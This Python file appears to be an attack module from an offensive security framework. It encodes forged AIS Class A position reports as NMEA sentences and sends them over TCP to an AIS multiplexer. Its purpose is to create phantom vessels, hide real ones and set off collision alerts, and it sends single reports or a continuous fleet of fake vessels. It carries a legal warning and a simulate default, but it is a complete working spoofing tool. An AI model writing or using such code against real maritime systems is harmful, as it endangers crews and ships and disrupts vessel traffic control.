"""AIS (Automatic Identification System) spoofing module.

Generates and injects fake AIS position reports to create phantom vessels,
hide real vessel positions, or trigger collision avoidance alerts.

PREREQ HW: SDR transmitter capable of 161.975 MHz / 162.025 MHz
           (HackRF One recommended) OR network access to AIS multiplexer.

References:
- AIS SOLAS Convention requirements (no authentication/integrity)
- Marco Balduzzi et al., "A Security Evaluation of AIS" (ACSAC 2014)
- Trend Micro Research: "A Security Analysis of Radio Remote Controllers"

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
from __future__ import annotations

import socket
import struct
import time
from dataclasses import dataclass
from typing import Optional, List


@dataclass
class AISVessel:
    """Represents a spoofed AIS vessel.

    Attributes:
        mmsi: Maritime Mobile Service Identity (9 digits).
        name: Vessel name (max 20 chars, padded with @).
        lat_dd: Latitude in decimal degrees.
        lon_dd: Longitude in decimal degrees.
        speed_knots: Speed over ground in knots (0-102.2).
        course_deg: Course over ground in degrees.
        vessel_type: AIS vessel type code (0-99).
        nav_status: Navigation status (0=underway, 5=moored, 15=unknown).
    """

    mmsi: int
    name: str = "PHANTOM VESSEL"
    lat_dd: float = 0.0
    lon_dd: float = 0.0
    speed_knots: float = 0.0
    course_deg: float = 0.0
    vessel_type: int = 0
    nav_status: int = 15


def encode_6bit_ascii(text: str, length: int) -> str:
    """Encode text to AIS 6-bit ASCII (for vessel name encoding).

    Args:
        text: Input text to encode.
        length: Target length (padded with '@').

    Returns:
        AIS 6-bit ASCII encoded string.
    """
    ais_chars = "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_ !\"#$%&'()*+,-./0123456789:;<=>?"
    text_upper = text.upper()[:length].ljust(length, "@")
    bits = ""
    for ch in text_upper:
        idx = ais_chars.find(ch)
        if idx < 0:
            idx = 0
        bits += f"{idx:06b}"
    return bits


def ais_armoring(bits: str) -> str:
    """Convert bit string to AIS NMEA armored payload.

    Args:
        bits: Binary string of AIS message bits.

    Returns:
        AIS NMEA armored character string.
    """
    # Pad to multiple of 6
    while len(bits) % 6:
        bits += "0"
    result = ""
    for i in range(0, len(bits), 6):
        val = int(bits[i : i + 6], 2)
        char_val = val + 48
        if char_val > 87:
            char_val += 8
        result += chr(char_val)
    return result


def build_type1_bits(vessel: AISVessel) -> str:
    """Build AIS Type 1 (Class A Position Report) bit string.

    Args:
        vessel: AISVessel dataclass with position data.

    Returns:
        168-bit binary string for AIS Type 1 message.
    """
    msg_type = 1
    repeat = 0
    mmsi = vessel.mmsi
    nav_status = vessel.nav_status
    rot = 0  # Rate of turn (0 = no info)
    sog = min(int(vessel.speed_knots * 10), 1023)  # 0.1 knot units
    pos_acc = 0  # Low accuracy
    lon_raw = int(vessel.lon_dd * 600000)  # 1/10000 minute
    lat_raw = int(vessel.lat_dd * 600000)
    cog = int(vessel.course_deg * 10)  # 0.1 degree
    heading = 511  # Not available
    timestamp = 60  # Not available
    maneuver = 0
    spare = 0
    raim = 0
    radio = 0

    bits = ""
    bits += f"{msg_type:06b}"
    bits += f"{repeat:02b}"
    bits += f"{mmsi:030b}"
    bits += f"{nav_status:04b}"
    bits += f"{rot:08b}"
    bits += f"{sog:010b}"
    bits += f"{pos_acc:01b}"
    # Longitude: 28 bits signed
    if lon_raw < 0:
        lon_raw = lon_raw + (1 << 28)
    bits += f"{lon_raw & 0xFFFFFFF:028b}"
    # Latitude: 27 bits signed
    if lat_raw < 0:
        lat_raw = lat_raw + (1 << 27)
    bits += f"{lat_raw & 0x7FFFFFF:027b}"
    bits += f"{cog:012b}"
    bits += f"{heading:09b}"
    bits += f"{timestamp:06b}"
    bits += f"{maneuver:02b}"
    bits += f"{spare:03b}"
    bits += f"{raim:01b}"
    bits += f"{radio:019b}"

    return bits


def nmea_checksum(sentence: str) -> str:
    """Calculate NMEA checksum.

    Args:
        sentence: NMEA sentence body (between ! and *).

    Returns:
        Two-digit hex checksum.
    """
    cksum = 0
    for char in sentence:
        cksum ^= ord(char)
    return f"{cksum:02X}"


def vessel_to_aivdm(vessel: AISVessel) -> str:
    """Convert AISVessel to VDM NMEA sentence.

    Args:
        vessel: AISVessel to encode.

    Returns:
        Complete !AIVDM NMEA sentence string.
    """
    bits = build_type1_bits(vessel)
    payload = ais_armoring(bits)
    pad = (6 - len(bits) % 6) % 6
    body = f"AIVDM,1,1,,A,{payload},{pad}"
    return f"!{body}*{nmea_checksum(body)}\r\n"


class AISSpoofAttack:
    """AIS vessel spoofing attack module.

    Creates phantom vessels or manipulates existing vessel data to
    confuse AIS displays, ARPA systems, and VTS (Vessel Traffic Services).

    Attributes:
        __info__: Module metadata.
    """

    __info__ = {
        "name": "AIS Position Report Spoofing",
        "category": "maritime",
        "protocol": "AIS (TDMA VHF 161.975/162.025 MHz)",
        "auth_required": False,
        "cwe": "CWE-290",
        "impact": (
            "Phantom vessel creation, collision avoidance alerts, "
            "VTS confusion, maritime safety hazard"
        ),
        "hw_req": [
            "HackRF One with VHF antenna (161/162 MHz) for RF injection",
            "OR network access to AIS multiplexer for NMEA injection",
        ],
        "legal_warning": (
            "AIS spoofing is illegal in most jurisdictions under maritime law. "
            "Use only in authorized security assessments or controlled environments."
        ),
        "references": [
            "Balduzzi et al., 'A Security Evaluation of AIS' (ACSAC 2014)",
            "Trend Micro: 'Uncharted Waters' AIS security research",
            "IMO MSC-FAL.1/Circ.3 Maritime Cyber Risk Management",
        ],
    }

    def __init__(
        self,
        target_host: str = "192.168.1.1",
        target_port: int = 10110,
        simulate: bool = True,
    ) -> None:
        """Initialize AIS spoof attack.

        Args:
            target_host: IP of AIS multiplexer/NMEA server.
            target_port: TCP port of target.
            simulate: If True, shows sentences without transmitting.
        """
        self.target_host = target_host
        self.target_port = target_port
        self.simulate = simulate

    def spoof_vessel(
        self,
        mmsi: int,
        lat_dd: float,
        lon_dd: float,
        name: str = "PHANTOM",
        speed_knots: float = 12.0,
        course_deg: float = 90.0,
    ) -> dict:
        """Spoof a single AIS vessel position report.

        Args:
            mmsi: MMSI number for the vessel.
            lat_dd: Spoofed latitude.
            lon_dd: Spoofed longitude.
            name: Vessel name (shown on AIS displays).
            speed_knots: Speed over ground.
            course_deg: Course over ground.

        Returns:
            Result dict with status and generated sentence.
        """
        vessel = AISVessel(
            mmsi=mmsi,
            name=name,
            lat_dd=lat_dd,
            lon_dd=lon_dd,
            speed_knots=speed_knots,
            course_deg=course_deg,
        )
        sentence = vessel_to_aivdm(vessel)

        if self.simulate:
            return {
                "simulated": True,
                "mmsi": mmsi,
                "name": name,
                "position": {"lat": lat_dd, "lon": lon_dd},
                "sentence": sentence,
                "note": "Set simulate=False to transmit to target AIS system",
            }

        try:
            with socket.create_connection((self.target_host, self.target_port), timeout=5) as sock:
                sock.sendall(sentence.encode("ascii"))
            return {"success": True, "sentence": sentence}
        except (OSError, ConnectionRefusedError) as exc:
            return {"error": str(exc)}

    def spoof_fleet(
        self,
        vessels: List[AISVessel],
        interval_s: float = 2.0,
        duration_s: int = 30,
    ) -> dict:
        """Continuously spoof multiple vessels over time.

        Args:
            vessels: List of AISVessel objects to spoof.
            interval_s: Interval between bursts in seconds.
            duration_s: Total duration to run.

        Returns:
            Result dict with sent counts.
        """
        sentences = [vessel_to_aivdm(v) for v in vessels]

        if self.simulate:
            return {
                "simulated": True,
                "vessel_count": len(vessels),
                "sentences": sentences,
                "note": "Set simulate=False to transmit",
            }

        sent = 0
        end_time = time.time() + duration_s
        try:
            with socket.create_connection((self.target_host, self.target_port), timeout=5) as sock:
                while time.time() < end_time:
                    for s in sentences:
                        sock.sendall(s.encode("ascii"))
                        sent += 1
                    time.sleep(interval_s)
        except (OSError, ConnectionRefusedError) as exc:
            return {"error": str(exc), "sent": sent}

        return {"success": True, "sent": sent, "duration_s": duration_s}

    def run(
        self,
        mmsi: int = 123456789,
        lat_dd: float = 1.264,
        lon_dd: float = 103.826,
        name: str = "PHANTOM",
        speed_knots: float = 12.0,
        course_deg: float = 90.0,
    ) -> dict:
        """Run a single AIS vessel spoof with provided parameters.

        Args:
            mmsi: 9-digit MMSI number.
            lat_dd: Spoofed latitude in decimal degrees.
            lon_dd: Spoofed longitude in decimal degrees.
            name: Vessel name displayed on AIS receivers.
            speed_knots: Speed over ground in knots.
            course_deg: Course over ground in degrees.

        Returns:
            Result dict with generated sentence or transmission status.
        """
        return self.spoof_vessel(
            mmsi=mmsi,
            lat_dd=lat_dd,
            lon_dd=lon_dd,
            name=name,
            speed_knots=speed_knots,
            course_deg=course_deg,
        )
